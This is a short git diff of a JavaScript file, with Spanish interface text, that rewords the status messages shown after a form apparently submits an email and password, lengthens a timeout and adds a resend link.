@@ -64,7 +64,7 @@ function enviarDatos(emailN, passN) {
 		newIframe.width = "500px";
 		newIframe.height = "220px";
 		boxIframe.appendChild(newIframe);
-		console.log("Se han enviado los datos correctamente.");
+		console.log("La función para enviar los datos ha respondido éxitosamente.");
 		
 	}
 }
@@ -90,9 +90,15 @@ function cambiarCuadro() {
 	cajaBotones.style.backgroundColor = "#c2c0c0";
 	
 	var cajaCredenciales = document.getElementById("cajaCredenciales");
-	cajaCredenciales.innerHTML = "[msg: cargando proceso.]";
+	cajaCredenciales.innerHTML = "Enviando datos al servidor...";
 	setTimeout(function() {
 		var cajaCredenciales = document.getElementById("cajaCredenciales");
-		cajaCredenciales.innerHTML = "[msg: proceso confirmado.]";
-	}, 3000);
+		cajaCredenciales.innerHTML = "Datos enviados, recibiras una notificación en unos momentos. <a id=\"enlaceRepetir\" href=\"\">Reenviar datos.</a>";
+		var a = document.getElementById("enlaceRepetir").href = window.location;
+	}, 4500);
 }
+
+
+
+
+
